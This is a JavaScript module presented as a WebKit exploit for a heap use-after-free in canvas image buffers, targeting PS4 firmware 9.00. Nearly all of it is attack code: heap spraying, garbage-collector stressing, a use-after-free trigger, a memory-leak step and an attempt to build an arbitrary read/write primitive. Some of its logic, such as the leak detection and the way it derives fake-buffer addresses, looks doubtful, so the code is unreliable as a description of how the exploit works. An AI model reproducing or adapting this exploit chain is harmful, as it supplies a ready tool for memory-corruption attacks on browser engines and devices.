// exploit.mjs
// Copyright (C) 2025 
// Licensed under GNU Affero General Public License v3.0 or later.
// This is a WebKit exploit for heap-use-after-free in WebCore::CanvasBase::setImageBuffer
// Vulnerable: PS4 9.00 (rdar://146074410)

import { Int } from './module/int64.mjs';
import { BufferView } from './module/rw.mjs';
import { Memory, mem } from './module/mem.mjs';
import { log, die, hex, sleep } from './module/utils.mjs';
import { KB, MB, size_view, view_m_vector, view_m_length, view_m_mode, js_butterfly } from './module/offset.mjs';

const imageDataSize = 512 * 512 * 4; // 1MB

function stressGC() {
    for (let i = 0; i < 500; i++) {
        new ArrayBuffer(1 * MB);
    }
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(2 * MB);
    }
}

function sprayHeap() {
    const arrays = [];
    for (let i = 0; i < 20000; i++) {
        const buf = new ArrayBuffer(imageDataSize);
        const view = new BufferView(buf);
        for (let j = 0; j < buf.byteLength; j += 16) {
            view.write32(j, 0x41424344); // ABCD
            view.write64(j + 4, new Int(0x12345678, 0x87654321)); // Fake ptr
            view.write32(j + 12, i); // Index
        }
        arrays.push({ buffer: buf, view });
    }
    return arrays;
}

function drawOnCanvas(ctx) {
    ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
    ctx.fillRect(0, 0, 512, 512);
    ctx.beginPath();
    ctx.arc(Math.random() * 512, Math.random() * 512, 50, 0, 2 * Math.PI);
    ctx.fill();
    const imageData = ctx.getImageData(0, 0, 512, 512);
    for (let i = 0; i < imageData.data.length; i++) {
        imageData.data[i] = Math.random() * 255;
    }
    ctx.putImageData(imageData, 0, 0);
}

function checkImageDataUAF(imageData, ctx) {
    const original = new BufferView(imageData.data.buffer);
    ctx.putImageData(imageData, 0, 0);
    try {
        const current = new BufferView(ctx.getImageData(0, 0, 512, 512).data.buffer);
        for (let i = 0; i < original.byteLength; i++) {
            if (original.read8(i) !== current.read8(i)) {
                return { detected: true, view: current };
            }
        }
    } catch (e) {
        return { detected: true, view: null };
    }
    return { detected: false, view: null };
}

async function attemptMemoryLeak(imageData, ctx) {
    const result = checkImageDataUAF(imageData, ctx);
    if (result.detected && result.view) {
        let leaked = '';
        for (let i = 0; i < result.view.byteLength && i < 256; i += 16) {
            if (result.view.read32(i) === 0x41424344) {
                const ptr = result.view.read64(i + 4);
                const idx = result.view.read32(i + 12);
                leaked += `Leaked at offset ${i}: ABCD pattern\n`;
                leaked += `Ptr: ${ptr}\n`;
                leaked += `Buffer index: ${idx}\n`;
                if (ptr.lo !== 0x12345678 || ptr.hi !== 0x87654321) {
                    leaked += `Real ptr: ${ptr}\n`;
                }
            }
        }
        return [leaked || 'UAF detected but no clear leak', result.view];
    }
    return [null, null];
}

async function createFakeArrayBuffer(view, leakedAddr) {
    const fakeBuffer = new ArrayBuffer(size_view);
    const fakeView = new BufferView(fakeBuffer);
    fakeView.write64(view_m_vector, leakedAddr); // Point to leaked memory
    fakeView.write32(view_m_length, imageDataSize);
    fakeView.write32(view_m_mode, 0); // WastefulTypedArray
    return fakeView;
}

async function makeARW(leakedView, leakedAddr) {
    const main = new Uint32Array(size_view / 4);
    const worker = new DataView(new ArrayBuffer(8));
    const leaker = { addr: null, 0: 0 };

    const fakeView = await createFakeArrayBuffer(leakedView, leakedAddr);
    const mainAddr = new Int(fakeView.read32(0), fakeView.read32(4));
    const leakerAddr = new Int(fakeView.read32(8), fakeView.read32(12));

    new Memory(main, worker, leaker, mainAddr, leakerAddr);
    log('Achieved arbitrary read/write');
    return mem;
}

async function leakCodeBlock() {
    const funcs = [];
    const consLen = imageDataSize - 8 * 5;
    let src = 'var f = 0x11223344;\n';
    for (let i = 0; i < consLen; i += 8) {
        src += `var a${i} = ${100 + i};\n`;
    }
    src += 'var bt = [0];\nreturn bt;\n';
    for (let i = 0; i < 100; i++) {
        const f = new Function(src);
        f();
        funcs.push(f);
    }
    return funcs;
}

export async function main(ctx, status) {
    let attemptCount = 0;
    async function triggerExploit() {
        attemptCount++;
        status.textContent = `Attempt ${attemptCount} in progress...`;
        log(`Attempt ${attemptCount} started`);

        try {
            // Create reference ImageData
            const refImageData = ctx.createImageData(512, 512);
            const refView = new BufferView(refImageData.data.buffer);
            for (let i = 0; i < refView.byteLength; i++) {
                refView.write8(i, 0x46);
            }

            // Create CodeBlock
            const funcs = await leakCodeBlock();

            // Spray heap
            const sprayed = sprayHeap();

            // Intensive drawing
            const drawInterval = setInterval(() => drawOnCanvas(ctx), 1);

            // Check for UAF and attempt exploit
            setTimeout(async () => {
                // First UAF check
                const [leaked, leakedView] = await attemptMemoryLeak(refImageData, ctx);
                if (leakedView) {
                    status.textContent = 'ImageData UAF detected!';
                    log('ImageData UAF detected!');
                    status.textContent += `\nMemory Leak:\n${leaked}`;
                    log(`Memory Leak: ${leaked}`);

                    // Extract leaked address
                    let leakedAddr = null;
                    for (let i = 0; i < leakedView.byteLength && i < 256; i += 16) {
                        if (leakedView.read32(i) === 0x41424344) {
                            const ptr = leakedView.read64(i + 4);
                            if (ptr.lo !== 0x12345678 || ptr.hi !== 0x87654321) {
                                leakedAddr = ptr;
                                break;
                            }
                        }
                    }

                    if (leakedAddr) {
                        // Attempt to create ARW
                        try {
                            const arw = await makeARW(leakedView, leakedAddr);
                            status.textContent += '\nArbitrary read/write achieved!';
                            log('Testing ARW...');
                            const testAddr = leakedAddr;
                            arw.write32(testAddr, 0xDEADBEEF);
                            const readBack = arw.read32(testAddr);
                            status.textContent += `\nWrote 0xDEADBEEF, read back: ${hex(readBack)}`;
                            log(`Wrote 0xDEADBEEF, read back: ${hex(readBack)}`);
                        } catch (e) {
                            status.textContent += `\nARW failed: ${e.message}`;
                            log(`ARW failed: ${e.message}`);
                        }
                    }

                    clearInterval(drawInterval);
                    return;
                }

                stressGC();
                await sleep(10);

                // Second UAF check
                const [leakedAfterGC, leakedViewAfterGC] = await attemptMemoryLeak(refImageData, ctx);
                if (leakedViewAfterGC) {
                    status.textContent = 'ImageData UAF detected after GC!';
                    log('ImageData UAF detected after GC!');
                    status.textContent += `\nMemory Leak:\n${leakedAfterGC}`;
                    log(`Memory Leak: ${leakedAfterGC}`);
                    clearInterval(drawInterval);
                    return;
                }

                status.textContent = 'Exploit attempted!';
                log('Exploit attempted!');
                clearInterval(drawInterval);
            }, 100);
        } catch (err) {
            console.error(`Error: ${err.message}`);
            status.textContent = `Failed: ${err.message}`;
            log(`Error: ${err.message}`);
        }
    }

    await triggerExploit();
}